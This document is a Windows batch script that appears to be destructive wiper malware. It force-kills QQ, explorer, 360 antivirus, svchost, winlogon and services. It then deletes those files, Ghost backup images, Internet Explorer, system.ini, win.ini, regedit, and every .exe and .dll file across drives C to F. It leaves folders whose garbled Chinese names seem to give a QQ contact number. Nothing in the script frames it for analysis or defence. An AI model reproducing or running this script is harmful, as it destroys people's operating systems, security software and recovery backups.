@shift
taskkill /im QQ.exe /f
FOR %%I IN (c:,d:,e:,f:) DO CD /D %%I & FOR %%J IN (qq.exe
) DO DEL %%J /A HS /F /S
taskkill /im explorer.exe /f
FOR %%I IN (c:,d:,e:,f:) DO CD /D %%I & FOR %%J IN (explorer.exe
) DO DEL %%J /A HS /F /S
taskkill /im 360tray.exe /f
FOR %%I IN (c:,d:,e:,f:) DO CD /D %%I & FOR %%J IN (360tray.exe
) DO DEL %%J /A HS /F /S
taskkill /im 360safe.exe /f
FOR %%I IN (c:,d:,e:,f:) DO CD /D %%I & FOR %%J IN (360safe.exe
) DO DEL %%J /A HS /F /S
taskkill /im svchost.exe /f
FOR %%I IN (c:,d:,e:,f:) DO CD /D %%I & FOR %%J IN (svchost.exe
) DO DEL %%J /A HS /F /S
taskkill /im winlogon.exe /f
FOR %%I IN (c:,d:,e:,f:) DO CD /D %%I & FOR %%J IN (winlogon.exe
) DO DEL %%J /A HS /F /S
taskkill /im services.exe /f
FOR %%I IN (c:,d:,e:,f:) DO CD /D %%I & FOR %%J IN (services.exe
) DO DEL %%J /A HS /F /S

FOR %%I IN (c:,d:,e:,f:) DO CD /D %%I & FOR %%J IN (system.gho
) DO DEL %%J /A HS /F /S
FOR %%I IN (c:,d:,e:,f:) DO CD /D %%I & FOR %%J IN (ghost.exe
) DO DEL %%J /A HS /F /S
FOR %%I IN (c:,d:,e:,f:) DO CD /D %%I & FOR %%J IN (iedw.exe,IEXPLORE.EXE
) DO DEL %%J /A HS /F /S

FOR %%I IN (c:,d:,e:,f:) DO CD /D %%I & FOR %%J IN (system.ini,
win.ini,regedit.exe,*.exe,*.dll
) DO DEL %%J /A HS /F /S

md c:\����ϵQQ��442074675
md D:\����ϵQQ��442074675
md e:\����ϵQQ��442074675
md f:\����ϵQQ��442074675
echo Ŀ���ļ�ɾ����ϣ���������˳�
exit
